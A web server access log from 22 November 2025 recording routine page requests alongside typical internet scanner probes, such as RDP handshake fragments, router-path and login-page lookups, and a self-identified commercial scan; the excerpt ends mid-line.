118.123.1.40 - - [22/Nov/2025:08:41:21 +0800] "GET /index.php HTTP/1.1" 404 555 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
118.123.1.40 - - [22/Nov/2025:08:41:21 +0800] "GET /login/stylesheets/theme.css HTTP/1.1" 404 555 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
118.123.1.40 - - [22/Nov/2025:08:41:21 +0800] "GET /customer/js/lang_zh_tw.js HTTP/1.1" 404 555 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
118.123.1.40 - - [22/Nov/2025:08:41:21 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
118.123.1.40 - - [22/Nov/2025:08:41:21 +0800] "GET /stylesheets/theme.css HTTP/1.1" 404 555 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
118.123.1.40 - - [22/Nov/2025:08:41:21 +0800] "GET /chs/js/lang_zh_tw.js HTTP/1.1" 404 555 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
157.230.29.20 - - [22/Nov/2025:08:45:17 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
57.151.97.194 - - [22/Nov/2025:09:23:43 +0800] "MGLNDD_120.55.251.144_80" 400 157 "-" "-"
193.142.147.209 - - [22/Nov/2025:09:33:07 +0800] "GET / HTTP/1.1" 200 3958 "-" "-"
157.230.29.20 - - [22/Nov/2025:09:33:41 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
83.142.209.125 - - [22/Nov/2025:10:03:35 +0800] "GET /login.rsp HTTP/1.1" 404 153 "-" "Hello World"
198.235.24.149 - - [22/Nov/2025:10:14:25 +0800] "GET / HTTP/1.1" 200 3958 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity"
157.230.29.20 - - [22/Nov/2025:10:23:06 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
88.214.50.115 - - [22/Nov/2025:10:36:37 +0800] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 157 "-" "-"
34.38.246.252 - - [22/Nov/2025:10:37:27 +0800] "GET / HTTP/1.1" 200 3958 "-" "python-requests/2.32.5"
209.38.201.154 - - [22/Nov/2025:10:46:32 +0800] "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 157 "-" "-"
192.159.99.180 - - [22/Nov/2025:10:47:46 +0800] "GET / HTTP/1.1" 200 3958 "-" "-"
165.22.72.144 - - [22/Nov/2025:11:03:20 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0"
157.230.29.20 - - [22/Nov/2025:11:10:30 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.142.147.209 - - [22/Nov/2025:11:12:30 +0800] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
157.230.29.20 - - [22/Nov/2025:11:35:50 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Wi